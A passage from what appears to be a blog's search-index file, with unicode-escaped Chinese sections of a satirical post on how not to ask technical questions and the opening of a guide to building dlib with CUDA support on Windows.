\u95ee\u9898\u7684\u89e3\u51b3\u3002 \u5176\u6b21\uff0c\u4e0e\u63d0\u51fa X-Y \u95ee\u9898 \u7c7b\u4f3c\u7684\u505a\u6cd5\u662f\u64c5\u81ea\u52a0\u5165\u989d\u5916\u7684\u731c\u6d4b\uff08\u53ef\u4ee5\u89c6\u4e3a\u662f\u4e00\u79cd \u201c\u663e\u5f0f\u201d \u7684 X-Y \u95ee\u9898 \uff09\uff0c\u5e76\u8981\u6c42\u56de\u7b54\u8005\u89e3\u7b54\u5b83\uff0c\u4f8b\u5982\uff1a \u4f8b 6 Q: XXX \u8fd9\u4e2a\u5730\u65b9\u62a5\u9519\u4e86\uff0c\u6211\u89c9\u5f97\u53ef\u80fd\u662f YYY \u7684\u95ee\u9898\uff0c\u80fd\u5e2e\u6211\u89e3\u51b3\u4e0b YYY \u5417\uff1f \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4f60\u4e0d\u4ec5\u53ef\u4ee5\u8ba9\u81ea\u5df1\u6210\u4e3a\u4e00\u4e2a\u5f31\u667a\uff0c\u8fd8\u53ef\u4ee5\u7981\u9522\u56de\u7b54\u8005\u7684\u601d\u7ef4\uff0c\u4ece\u800c\u96be\u4ee5\u5f97\u51fa\u6b63\u786e\u7684\u7b54\u6848\u3002 \u8bd5\u56fe\u8ba9\u56de\u7b54\u8005\u66ff\u4f60\u505a\u4e8b \u00b6 \u5bf9\u4e8e\u5f31\u667a\u800c\u8a00\uff0c\u56de\u7b54\u8005\u6c38\u8fdc\u662f\u4ed6\u4eec\u7684\u5974\u96b6\u3002\u4f60\u53ef\u4ee5\u8981\u6c42\u56de\u7b54\u8005\u66ff\u4f60\u505a\u4e00\u4e9b\u4f60\u4e0d\u60f3\u4eb2\u81ea\u52a8\u624b\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\uff1a \u4f8b 7 Q: TCP + TLS + Web \u4e3a\u5565\u9700\u8981 Web \u524d\u9700\u8981 HAProxy \u554a\uff0cnginx \u4e5f\u6709\u8fd9\u79cd\u529f\u80fd\u554a \u975e\u8981\u524d\u9762 HAProxy\uff0c\u540e\u9762\u518d\u5f04\u4e2a nginx/httpd\u3002 \u5bf9\u4e8e\u4e2a\u4eba\u4f7f\u7528\u6ca1\u5fc5\u8981\u5427\u3002 \u5f53\u7136\u4f60\u642d\u5efa\u5546\u4e1a\u7684\u9664\u5916 A: \u4e0d\u8981\u518d\u95ee\u8fd9\u79cd\u95ee\u9898\u4e86\uff0c\u4f60\u89c9\u5f97\u53ef\u4ee5\u5c31\u81ea\u5df1\u642d\uff0c\u642d\u6210\u4e86\u53ef\u4ee5\u5199\u7ed9\u6559\u7a0b pr Q: nginx \u7684 stream \u5757\u4e0d\u884c\u5417 A: \u4e0d\u8981\u518d\u95ee\u8fd9\u79cd\u95ee\u9898\u4e86\uff0c\u4f60\u89c9\u5f97\u53ef\u4ee5\u5c31\u81ea\u5df1\u642d\uff0c\u642d\u6210\u4e86\u53ef\u4ee5\u5199\u7ed9\u6559\u7a0b pr \u7528\u63cf\u8ff0\u9519\u8bef\u53d6\u4ee3\u63d0\u51fa\u95ee\u9898 \u00b6 \u80fd\u901a\u8fc7\u8fd9\u4e2a\u9014\u5f84\u6210\u4e3a\u5f31\u667a\u7684\u4eba\u5c11\u4e4b\u53c8\u5c11\uff0c\u56e0\u4e3a\u5f88\u5c11\u6709\u4eba\u80fd\u505a\u5230\u5728\u63d0\u51fa\u95ee\u9898\u7684\u65f6\u5019\u4ece\u4e0d\u4f7f\u7528 \u7591\u95ee\u53e5 \u3002 \u4f8b 8 Q: \u6211\u628a\u540e\u7f00\u540d\u6539\u6210 zip\uff0c\u7136\u540e rar\u30017z \u4ec0\u4e48\u7684\u90fd\u8bd5\u8fc7\u4e86\uff0c\u8fd8\u662f\u4e0d\u884c A: \u80fd\u5426\u76f4\u63a5\u8bf4\u95ee\u9898\uff1f \u6ce8\u610f \u5982\u679c\u4f60\u771f\u7684\u662f\u4e3a\u4e86\u5355\u7eaf\u63cf\u8ff0\u9519\u8bef\uff08\u800c\u975e\u63d0\u51fa\u95ee\u9898\uff09\uff0c\u90a3\u4e48\u8fd9\u6761\u9014\u5f84\u4e0d\u9002\u7528\u4e8e\u4f60\uff0c\u56e0\u4e3a\u63cf\u8ff0\u9519\u8bef\u53ef\u4ee5\u4e0d\u4f7f\u7528\u7591\u95ee\u53e5\u3002","title":"\u5982\u4f55\u50cf\u4e00\u4e2a\u5f31\u667a\u4e00\u6837\u63d0\u95ee"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_1","text":"\u4e4b\u6240\u4ee5\u5c06\u5176\u653e\u5728\u8fd9\u7bc7\u535a\u5ba2\u4e2d\u6700\u663e\u773c\u7684\u4f4d\u7f6e\uff0c\u662f\u56e0\u4e3a\u8be5\u65b9\u6cd5\u662f\u6fc0\u6012\u56de\u7b54\u8005\u6700\u6709\u6548\u7684\u65b9\u6cd5\u3002 \u8be5\u65b9\u6cd5\u7684\u5173\u952e\u5728\u4e8e\uff1a\u4e0d\u8981\u5728\u63d0\u95ee\u4e2d\u63d0\u4f9b\u4efb\u4f55\u5185\u5bb9\uff08\u4f8b\u5982 \u590d\u73b0\u6b65\u9aa4 \u3001 \u65e5\u5fd7 \u3001 \u73af\u5883 \u4ee5\u53ca \u8f6f\u4ef6\u7248\u672c \u7b49\uff09\uff0c\u8fd9\u4e9b\u5185\u5bb9\u5c06\u6709\u52a9\u4e8e\u56de\u7b54\u8005\u66f4\u597d\u5730\u7406\u89e3\u95ee\u9898\uff0c\u56e0\u800c\u65e0\u6cd5\u4f53\u73b0\u4f60\u662f\u4e00\u4e2a\u5f31\u667a\u3002 \u4f8b 1 \u5f00\u5c40\u4e00\u53e5\u8bdd\uff0c\u5185\u5bb9\u5168\u9760\u731c \u6709\u4e00\u4e2a\u5b6a\u751f\u5144\u5f1f\uff0c\u90a3\u5c31\u662f \u5f00\u5c40\u4e00\u5f20\u56fe\uff0c\u5185\u5bb9\u5168\u9760\u731c \uff0c\u4f8b\u5982\uff1a \u4f8b 2 \u63d0\u793a\uff1a\u7531\u4e8e\u4f60\u8ba4\u4e3a\u56de\u7b54\u8005\u7684\u601d\u8003\u9891\u7387\u6c38\u8fdc\u548c\u4f60\u662f\u76f8\u540c\u7684\uff0c\u6545\u5728\u63d0\u95ee\u65f6\u65e0\u9700 \u82b1\u65f6\u95f4\u7ec4\u7ec7\u597d\u8bed\u8a00 \uff0c\u8fd9\u79cd\u4e0d\u660e\u6240\u4ee5\u7684\u95ee\u9898\u53ef\u4ee5\u8d77\u5230\u706b\u4e0a\u6d47\u6cb9\u7684\u4f5c\u7528\u3002 \u4f60\u4e5f\u8bb8\u4f1a\u89c1\u5230\u4e00\u4e9b\u63d0\u95ee\u8005\u5728\u63cf\u8ff0\u81ea\u5df1\u60f3\u8981\u7684\u529f\u80fd\u6216 bug \u7684\u884c\u4e3a\u65f6 \u52a0\u5165\u4e00\u4e9b\u793a\u8303 \uff0c\u4f8b\u5982\uff1a \u6240\u8fdb\u884c\u7684\u64cd\u4f5c \u671f\u5f85\u7684\u7ed3\u679c \u5b9e\u9645\u7684\u7ed3\u679c \u8bf7\u4e0d\u8981\u5b66\u4e60\u4ed6\u4eec\uff0c\u56e0\u4e3a\u4ed6\u4eec\u4e0d\u662f\u5f31\u667a\u3002","title":"\u5f00\u5c40\u4e00\u53e5\u8bdd\uff0c\u5185\u5bb9\u5168\u9760\u731c"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_2","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u4efb\u4f55\u4e00\u4e2a\u9879\u76ee\u90fd\u662f\u5199\u7ed9\u6709\u4e00\u5b9a\u9884\u5907\u77e5\u8bc6\u7684\u7528\u6237\u7684\u3002\u8fd9\u4e9b\u6240\u8c13\u7684\u9884\u5907\u77e5\u8bc6\uff0c\u4e00\u822c\u662f\u6307\u4f7f\u7528\u8be5\u9879\u76ee\uff08\u6216\u8005\u90e8\u7f72\u3001\u8fd0\u884c\u3001\u4fee\u6539\u7b49\uff09\u6240\u9700\u7684\u6700\u57fa\u672c\u7684\u6280\u80fd\u3002\u6216\u8bb8\u5bf9\u4e8e\u4e0d\u540c\u6c34\u5e73\u7684\u4eba\u6765\u8bf4\uff0c\u8fd9\u4e9b\u6240\u8c13\u7684\u9884\u5907\u77e5\u8bc6\u6807\u51c6\u53ef\u80fd\u4e0d\u5c3d\u76f8\u540c\uff0c\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u5730\u65b9\uff0c\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6\u662f\u516c\u8ba4\u7684\u3002 \u4f8b\u5982\u5728\u4e16\u754c\u4e0a\u7edd\u5927\u90e8\u5206\u5f00\u6e90\u9879\u76ee\u4e2d\uff0c \u82f1\u8bed \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u4e00\u4e2a\u5b8c\u5168\u57fa\u4e8e Python \u7684\u9879\u76ee\u4e2d\uff0c Python \u7684\u5b89\u88c5 \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u4e00\u4e2a\u7f51\u7edc\u76f8\u5173\u7684\u9879\u76ee\u4e2d\uff0c IP \u5730\u5740\u548c\u7aef\u53e3 \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u4e00\u4e2a\u88ab\u7528\u4e8e\u7535\u8111\u7684\u9879\u76ee\u4e2d\uff0c \u7535\u8111\u7684\u5f00\u5173\u673a \u662f\u9884\u5907\u77e5\u8bc6 \u4f8b\u5982\u5728\u6570\u5b66\u4e2d\uff0c \u56db\u5219\u8fd0\u7b97 \u662f\u9884\u5907\u77e5\u8bc6 \u5411\u5f31\u667a\u63d0\u4f9b\u8fd9\u4e9b\u6700\u57fa\u7840\u7684\u77e5\u8bc6\u663e\u7136\u4e0d\u662f\u793e\u533a\u7684\u4e49\u52a1\u4e4b\u4e00\uff0c\u56e0\u6b64\u5982\u679c\u4f60\u60f3\u8ba9\u56de\u7b54\u8005\u8ba4\u4e3a\u4f60\u662f\u4e00\u4e2a\u5f31\u667a\uff08\u6216\u8005\u8bf4\uff0c\u53d6\u60a6\u4f60\u7684\u56de\u7b54\u8005\uff09\uff0c\u90a3\u4e48\u5f53\u4f60\u9047\u5230\u8fd9\u4e9b\u95ee\u9898\u65f6\uff0c\u4f60\u5e94\u8be5\u7acb\u5373\u8be2\u95ee\u4ed6\u4eec\uff0c\u800c\u4e0d\u662f \u82b1 5 \u5206\u949f\u81ea\u884c\u5b66\u4e60\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6 \u3002\u4f8b\u5982\uff1a \u4f8b 3 Q: apk \u662f\u4ec0\u4e48\uff1f\u5728\u54ea\u91cc\u4e0b\u8f7d\u554a\uff1f\u7cfb\u7edf\u7981\u6b62\u6211\u5b89\u88c5\u600e\u4e48\u529e\u554a\uff1f \u50cf\u4e0a\u8ff0\u8fd9\u79cd\u53ef\u4ee5\u7528\u4e00\u4e2a\u5e76\u4e0d\u590d\u6742\u7684\u53e5\u5b50\u63cf\u8ff0\u7684\u9884\u5907\u77e5\u8bc6\u95ee\u9898\uff0c\u4f60\u5927\u591a\u90fd\u662f\u53ef\u4ee5\u5728 \u641c\u7d22\u5f15\u64ce \uff08\u4f8b\u5982 \u767e\u5ea6 \u6216\u8005 Google \uff09\u6216\u8005 \u8bba\u575b \uff08\u5982 Stack Overflow \uff09\u4e0a\u627e\u5230\u8fd9\u4e9b\u95ee\u9898\u7684\u7b54\u6848\u7684\u3002 \u5411\u4f60\u7684\u56de\u7b54\u8005\u8be2\u95ee\u8fd9\u4e9b\u9884\u5907\u77e5\u8bc6\u95ee\u9898\u6216\u8bb8\u4e5f\u662f\u4e00\u4e2a\u6fc0\u6012\u4ed6\u4eec\u7684\u65b9\u6848\uff0c\u8fd9\u53ef\u4ee5\u8ba9\u4ed6\u4eec\u89c9\u5f97\uff1a\u4e0e\u5176\u82b1\u65f6\u95f4\u4e3a\u8fd9\u4e2a\u5f31\u667a\u89e3\u51b3 \u600e\u4e48\u8ba9\u7535\u8111\u5173\u673a \u3001 \u600e\u4e48\u4f7f\u7528\u9f20\u6807 \u3001 \u5982\u4f55\u4e3a\u624b\u673a\u5145\u7535 \u8fd9\u7c7b\u95ee\u9898\uff0c\u4e0d\u5982\u8ba9\u4ed6\u53bb\u641c\u7d22\u5f15\u64ce\u4e0a\u641c\u7d22\u7b54\u6848\u6765\u5f97\u5feb\u3002","title":"\u8be2\u95ee\u4e0d\u53ef\u601d\u8bae\u7684\u9884\u5907\u77e5\u8bc6\u95ee\u9898"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_3","text":"\u4e00\u4e9b\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u5728\u81ea\u5df1\u7684\u9879\u76ee\u4e3b\u9875\u7684\u660e\u663e\u4f4d\u7f6e\u63d0\u4f9b\u6587\u6863\uff0c\u8fd9\u4e9b\u6587\u6863\u91cc\u53ef\u80fd\u63d0\u4f9b\u4e86\u4f60\u4f7f\u7528\u8be5\u9879\u76ee\u7684\u5fc5\u8981\u8bf4\u660e\u3002\u4f5c\u4e3a\u60f3\u8981\u6210\u4e3a\u5f31\u667a\u7684\u4eba\uff0c\u4f60\u5e94\u8be5\u4e0d\u8981\u82b1\u65f6\u95f4 \u67e5\u770b\u8fd9\u4e9b\u6587\u6863 \u3002 \u5982\u4f55\u77e5\u9053\u81ea\u5df1\u5df2\u7ecf\u53d8\u6210\u5f31\u667a\uff1f\uff08\u6216\u8005\u8bf4\u5982\u4f55\u53d1\u73b0\u81ea\u5df1\u53ef\u80fd\u5df2\u7ecf\u6fc0\u6012\u4e86\u5176\u4ed6\u56de\u7b54\u8005\uff09 \u5f53\u4f60\u53d1\u73b0\u81ea\u5df1\u7684\u56de\u7b54\u8005\u91cc\u6709\u4eba\u8ba9\u4f60\u53bb\u770b\u6587\u6863\u65f6\uff0c\u4f8b\u5982\uff1a \u4f8b 4 \u6b64\u65f6\u4f60\u5c31\u5df2\u7ecf\u53d8\u6210\u5f31\u667a\u4e86\u3002","title":"\u5728\u67e5\u770b\u6587\u6863\u524d\u63d0\u51fa\u95ee\u9898"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_4","text":"\u6ce8\u610f \u8fd9\u91cc\u7279\u6307 GitHub issue \u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u60c5\u5f62\u3002 GitHub \u7684 issue \u662f\u7528\u4e8e\u5411\u4ed3\u5e93\u4e2d\u7684\u9879\u76ee\u63d0\u95ee\u3001\u53d1\u8d77\u5efa\u8bae\u6216\u5bfb\u6c42\u5e2e\u52a9\u7684\u5730\u65b9\u3002\u5982\u679c\u4f60\u60f3\u8ba9\u81ea\u5df1\u6210\u4e3a issue \u63d0\u95ee\u8005\u4e2d\u6700\u9753\u7684\u4ed4\uff0c\u4f60\u53ef\u4ee5\u5728 issue \u4e2d\u63d0\u51fa\u4e0e\u539f\u9879\u76ee\u6beb\u4e0d\u76f8\u5173\u7684\u95ee\u9898\u3002 \u4f8b 5 Q: requests.exceptions.Timeout: HTTPConnectionPool(host='google.com', ... \u662f\u4ec0\u4e48\u610f\u601d\uff1f A: \u5927\u9646\u8bbf\u95ee\u4e0d\u4e86\uff0c\u9700\u8981\u4f7f\u7528\u4ee3\u7406 Q: \u4ece\u54ea\u91cc\u53ef\u4ee5\u641e\u5230\u4ee3\u7406\u554a\uff1f","title":"\u8be2\u95ee\u4e0d\u76f8\u5173\u7684\u95ee\u9898"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_5","text":"\u5728\u63d0\u51fa\u95ee\u9898\u7684\u65f6\u5019\uff0c\u4f60\u7684\u8111\u6d77\u4e2d\u5e94\u5f53\u59cb\u7ec8\u8ba4\u4e3a \u201c\u81ea\u5df1\u9009\u62e9\u7684\u9053\u8def\u6c38\u8fdc\u662f\u6b63\u786e\u7684\u201d\uff0c\u56e0\u4e3a\u4f60\u65e0\u9700\u5411\u56de\u7b54\u8005 \u63cf\u8ff0\u4f60\u7684\u6839\u672c\u95ee\u9898 \u3002 \u4e0e\u4e4b\u8bf4\u6cd5\u6700\u63a5\u8fd1\u7684\u662f X-Y \u95ee\u9898 \uff0c\u8fd9\u6307\u7684\u662f\uff1a X-Y \u95ee\u9898 \u4f60\u5728\u63d0\u95ee\u65f6\u53ef\u80fd\u6709\u4e00\u4e2a\u9ad8\u7ea7\u5c42\u6b21\u95ee\u9898 X \uff0c\u4f60\u89c9\u5f97\u89e3\u51b3\u4e86 Y \u8fd9\u4e2a\u4f4e\u7ea7\u5c42\u6b21\u95ee\u9898\u4fbf\u80fd\u89e3\u51b3 X \u8fd9\u4e2a\u9ad8\u7ea7\u5c42\u6b21\u95ee\u9898\u3002\u4e8e\u662f\u4f60\u5728\u793e\u533a\u8be2\u95ee Y \u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u6700\u7ec8\u793e\u533a\u5e2e\u4f60\u89e3\u51b3 Y \u95ee\u9898\u4e4b\u540e\uff0c\u53d1\u73b0 Y \u95ee\u9898\u7684\u89e3\u51b3\u5e76\u4e0d\u80fd\u5e2e\u52a9 X \u95ee\u9898\u7684\u89e3\u51b3\u3002 \u5176\u6b21\uff0c\u4e0e\u63d0\u51fa X-Y \u95ee\u9898 \u7c7b\u4f3c\u7684\u505a\u6cd5\u662f\u64c5\u81ea\u52a0\u5165\u989d\u5916\u7684\u731c\u6d4b\uff08\u53ef\u4ee5\u89c6\u4e3a\u662f\u4e00\u79cd \u201c\u663e\u5f0f\u201d \u7684 X-Y \u95ee\u9898 \uff09\uff0c\u5e76\u8981\u6c42\u56de\u7b54\u8005\u89e3\u7b54\u5b83\uff0c\u4f8b\u5982\uff1a \u4f8b 6 Q: XXX \u8fd9\u4e2a\u5730\u65b9\u62a5\u9519\u4e86\uff0c\u6211\u89c9\u5f97\u53ef\u80fd\u662f YYY \u7684\u95ee\u9898\uff0c\u80fd\u5e2e\u6211\u89e3\u51b3\u4e0b YYY \u5417\uff1f \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4f60\u4e0d\u4ec5\u53ef\u4ee5\u8ba9\u81ea\u5df1\u6210\u4e3a\u4e00\u4e2a\u5f31\u667a\uff0c\u8fd8\u53ef\u4ee5\u7981\u9522\u56de\u7b54\u8005\u7684\u601d\u7ef4\uff0c\u4ece\u800c\u96be\u4ee5\u5f97\u51fa\u6b63\u786e\u7684\u7b54\u6848\u3002","title":"\u81ea\u5df1\u9009\u62e9\u7684\u9053\u8def\u6c38\u8fdc\u662f\u6b63\u786e\u7684"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_6","text":"\u5bf9\u4e8e\u5f31\u667a\u800c\u8a00\uff0c\u56de\u7b54\u8005\u6c38\u8fdc\u662f\u4ed6\u4eec\u7684\u5974\u96b6\u3002\u4f60\u53ef\u4ee5\u8981\u6c42\u56de\u7b54\u8005\u66ff\u4f60\u505a\u4e00\u4e9b\u4f60\u4e0d\u60f3\u4eb2\u81ea\u52a8\u624b\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\uff1a \u4f8b 7 Q: TCP + TLS + Web \u4e3a\u5565\u9700\u8981 Web \u524d\u9700\u8981 HAProxy \u554a\uff0cnginx \u4e5f\u6709\u8fd9\u79cd\u529f\u80fd\u554a \u975e\u8981\u524d\u9762 HAProxy\uff0c\u540e\u9762\u518d\u5f04\u4e2a nginx/httpd\u3002 \u5bf9\u4e8e\u4e2a\u4eba\u4f7f\u7528\u6ca1\u5fc5\u8981\u5427\u3002 \u5f53\u7136\u4f60\u642d\u5efa\u5546\u4e1a\u7684\u9664\u5916 A: \u4e0d\u8981\u518d\u95ee\u8fd9\u79cd\u95ee\u9898\u4e86\uff0c\u4f60\u89c9\u5f97\u53ef\u4ee5\u5c31\u81ea\u5df1\u642d\uff0c\u642d\u6210\u4e86\u53ef\u4ee5\u5199\u7ed9\u6559\u7a0b pr Q: nginx \u7684 stream \u5757\u4e0d\u884c\u5417 A: \u4e0d\u8981\u518d\u95ee\u8fd9\u79cd\u95ee\u9898\u4e86\uff0c\u4f60\u89c9\u5f97\u53ef\u4ee5\u5c31\u81ea\u5df1\u642d\uff0c\u642d\u6210\u4e86\u53ef\u4ee5\u5199\u7ed9\u6559\u7a0b pr","title":"\u8bd5\u56fe\u8ba9\u56de\u7b54\u8005\u66ff\u4f60\u505a\u4e8b"},{"location":"blog/2022/220428-how-to-ask-questions-like-a-retard/#_7","text":"\u80fd\u901a\u8fc7\u8fd9\u4e2a\u9014\u5f84\u6210\u4e3a\u5f31\u667a\u7684\u4eba\u5c11\u4e4b\u53c8\u5c11\uff0c\u56e0\u4e3a\u5f88\u5c11\u6709\u4eba\u80fd\u505a\u5230\u5728\u63d0\u51fa\u95ee\u9898\u7684\u65f6\u5019\u4ece\u4e0d\u4f7f\u7528 \u7591\u95ee\u53e5 \u3002 \u4f8b 8 Q: \u6211\u628a\u540e\u7f00\u540d\u6539\u6210 zip\uff0c\u7136\u540e rar\u30017z \u4ec0\u4e48\u7684\u90fd\u8bd5\u8fc7\u4e86\uff0c\u8fd8\u662f\u4e0d\u884c A: \u80fd\u5426\u76f4\u63a5\u8bf4\u95ee\u9898\uff1f \u6ce8\u610f \u5982\u679c\u4f60\u771f\u7684\u662f\u4e3a\u4e86\u5355\u7eaf\u63cf\u8ff0\u9519\u8bef\uff08\u800c\u975e\u63d0\u51fa\u95ee\u9898\uff09\uff0c\u90a3\u4e48\u8fd9\u6761\u9014\u5f84\u4e0d\u9002\u7528\u4e8e\u4f60\uff0c\u56e0\u4e3a\u63cf\u8ff0\u9519\u8bef\u53ef\u4ee5\u4e0d\u4f7f\u7528\u7591\u95ee\u53e5\u3002","title":"\u7528\u63cf\u8ff0\u9519\u8bef\u53d6\u4ee3\u63d0\u51fa\u95ee\u9898"},{"location":"blog/2022/220429-dilb-ultimate-solution/","tags":["dlib","visual-studio","python","anaconda"],"text":"\u7eea\u8bba \u00b6 \u5386\u65f6 14 \u4e2a\u5c0f\u65f6\uff0c\u53cd\u590d\u4e0b\u8f7d\u9ad8\u8fbe 60 GB\uff0c\u91cd\u65b0\u90e8\u7f72\u6574\u4e2a Visual Studio \u591a\u8fbe 5 \u6b21\uff0c\u4ece\u800c\u6253\u78e8\u51fa\u7684 dlib \u5b89\u88c5\u7ec8\u6781\u89e3\u51b3\u65b9\u6848\uff0c\u4e13\u6ce8\u4e8e\u89e3\u51b3 dlib \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u5404\u79cd\u7591\u96be\u6742\u75c7\u3002 \u4f60\u662f\u5426\u6709\u4ee5\u4e0b\u82e6\u607c\uff1f You must use Visual Studio to build a python extension on Windows \u5bf9\u7740\u5341\u51e0\u4e2a GB \u7684 Visual Studio \u53d1\u6101 Anaconda \u88c5\u4e0a\u7684 dlib \u6ca1\u6cd5\u8c03\u7528 GPU \u4e0d\u4ec5 GPU \u5360\u7528\u7387\u4e3a 0\uff0cCPU \u4e5f\u8dd1\u4e0d\u6ee1 \u88c5\u4e0a\u4e86 Visual Studio\uff0c\u4ecd\u7136\u65e0\u6cd5\u7f16\u8bd1 dlib x64 \u548c x86 \u6253\u67b6 \u51e0\u4e2a CMake \u4e00\u8d77\u6253\u67b6 \u82f1\u4f1f\u8fbe CUDA \u9a71\u52a8\u5728 C \u76d8\u5230\u5904\u91ca\u653e\u6587\u4ef6\uff08lashi\uff09 \u660e\u660e\u88c5\u4e86 CUDA\uff0cCMakeList \u5374\u4ee5\u5404\u79cd\u5404\u6837\u7684\u7406\u7531\u4e0d\u8ba9\u4f60\u7528 \u4f8b\u5982\u5acc\u5f03\u4f60\u7684 CUDA \u7248\u672c\u592a\u9ad8\u6216\u592a\u4f4e \u4f8b\u5982\u5acc\u5f03\u4f60\u7684 Visual Studio \u7248\u672c\u592a\u9ad8\u6216\u592a\u4f4e CMakeList.txt \u7b2c 5 \u884c\u7ecf\u5178\u62a5\u9519 Permission Denied Temp \u6587\u4ef6\u5939\u5199\u5165\u4e0d\u4e86\u4e86 error C2734: \u201cGifAsciiTable8x8\u201d: \u5982\u679c\u4e0d\u662f\u5916\u90e8\u7684\uff0c\u5219\u5fc5\u987b\u521d\u59cb\u5316\u5e38\u91cf\u5bf9\u8c61 error C2065: \u201cssize_t\u201d: \u672a\u58f0\u660e\u7684\u6807\u8bc6\u7b26 \u5386\u7ecf\u5343\u8f9b\u4e07\u82e6\u88c5\u5b8c\u4e86\u7ed3\u679c\u8fd8\u662f dlib . DLIB_USE_CUDA == False ... \u88c5 dlib \u4e00\u76f4\u662f\u673a\u5668\u5b66\u4e60\u9886\u57df\u7684\u4e00\u4e2a\u5927\u96be\u9898\uff0c\u5b83\u8981\u6c42\u5f00\u53d1\u4eba\u5458\u62e5\u6709\u67d0\u4e9b\u7279\u5b9a\u7684 CUDA + Visual Studio + dlib + python \u7248\u672c\u7684\u7ec4\u5408\uff0c\u8fd9\u4e9b\u7ec4\u5408\u4e00\u65e6\u6709\u4e00\u4e2a\u73af\u8282\u51fa\u4e86\u95ee\u9898\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6574\u4e2a dlib \u6ca1\u6cd5\u7528\uff0c\u800c dlib \u53c8\u662f\u5f88\u591a\u5e93\uff08\u4f8b\u5982 face_recognition \uff09\u7684\u4f9d\u8d56\u5e93\u3002\u8fd9\u4e9b\u8270\u96be\u9669\u963b\u5c06\u6781\u5927\u5730\u6253\u51fb\u5f00\u53d1\u4eba\u5458\u5728\u673a\u5668\u5b66\u4e60\u9886\u57df\u653b\u575a\u7684\u4fe1\u5fc3\u3002 \u5373\u4f7f\u662f\u6709 \u4e07\u80fd \u4e4b\u79f0\u7684 Anaconda \uff0c\u5b83\u4e5f\u4e0d\u80fd\u5b8c\u5168\u8fd9\u4e2a\u95ee\u9898\u3002\u56e0\u4e3a\u5b83\u4e0b\u8f7d\u7684 dlib \u6ca1\u6709\u63d0\u4f9b GPU \u652f\u6301\uff0c\u8fd9\u76f4\u63a5\u9020\u6210\u4e86 \u4e00\u6838\u6709\u96be\uff0c\u4e07\u6838\u56f4\u89c2 \u7684\u7ecf\u5178\u5c40\u9762\u3002\u800c\u76ee\u524d\uff082022 \u5e74 4 \u6708\u5e95\uff09\u552f\u4e00\u80fd\u5728 Anaconda \u4ed3\u5e93\u4e2d\u627e\u5230\u7684\u6709\u5173 CUDA \u548c GPU \u7684\u8f6f\u4ef6\u5305\u53ea\u63d0\u4f9b\u4e86 Linux \u7684\u7f16\u8bd1\u7248\u672c\uff08 zeroae/dlib-cuda \u548c hoan/dlib-gpu \uff09\u4e14\u5747\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u66f4\u65b0\u3002 \u8fd9\u4f7f\u5f97\u624b\u5934\u6ca1\u6709 Visual Studio \u7684\u5f00\u53d1\u4eba\u5458\uff08\u5176\u5b9e\u5c31\u7b97\u6709 Visual Studio \u4e5f\u5dee\u4e0d\u591a\uff09\u5728 Windows \u5e73\u53f0\u4e0a\u5229\u7528 CNN\uff08\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff09\u8fdb\u884c\u4eba\u8138\u8bc6\u522b\u6216\u8005\u5176\u4ed6\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u65f6\uff0c\u7b80\u76f4\u548c\u5750\u7262\u4e00\u6837\u3002 \u8fd9\u4e2a\u65b9\u6848\u7684\u51fa\u73b0\uff0c\u5c31\u662f\u4e3a\u4e86\u7528\u4e00\u4e2a\u7b80\u5355\u3001\u76f4\u89c2\u3001\u6709\u6548\u7684\u65b9\u6cd5\uff0c\u4e00\u6b21\u6027\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u62df\u8bae\u65b9\u6848\u7684\u524d\u63d0\u6761\u4ef6 \u00b6 \u5728\u6240\u6709\u6b65\u9aa4\u5f00\u59cb\u4e4b\u524d\uff0c\u8bf7\u5148\u786e\u4fdd\u4f60\u6ee1\u8db3\u4ee5\u4e0b\u524d\u63d0\u6761\u4ef6\uff1a \u7cfb\u7edf\u67b6\u6784 \u00b6 \u4e3a\u4e86\u907f\u514d\u4e0d\u5fc5\u8981\u7684\u9ebb\u70e6\uff0c\u8bf7\u5728\u63a5\u4e0b\u6765\u7684 \u6240\u6709\u6b65\u9aa4 \u4e2d\uff0c\u5747\u4f7f\u7528 64 \u4f4d\u7cfb\u7edf\u67b6\u6784\uff08amd64 \u6216\u8005 x64\uff09\u3002 Conda \u00b6 \u76ee\u524d\u6211\u7684\u7248\u672c\u662f Anaconda 1.9.0\uff0c\u5176\u4ed6\u7248\u672c \u5e94\u8be5 \u4e0d\u5f71\u54cd\u3002\u540c\u7406\uff0cPython \u7248\u672c \u5e94\u8be5 \u4e5f\u4e0d\u5f71\u54cd\u3002 Visual Studio \u00b6 \u4ee5\u4e0b Visual Studio \u4e2d\uff0c\u4f60\u81f3\u5c11\u9700\u8981\u62e5\u6709\u4e00\u4e2a\uff1a Visual Studio 2019 Build Tools for Visual Studio 2019 Visual Studio 2017 Build Tools for Visual Studio 2017 \u56e0\u4e3a\u6211\u4e0d\u60f3\u4e0b\u5341\u51e0\u4e2a GB \u7684 Visual Studio 2019/2017\uff0c\u6240\u4ee5\u6211\u4f7f\u7528\u7684\u662f Build Tools for Visual Studio 2019\u3002\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u4ed6\u4ecd\u7136\u4f1a\u5360\u7528\u6211\u5927\u7ea6 4 GB 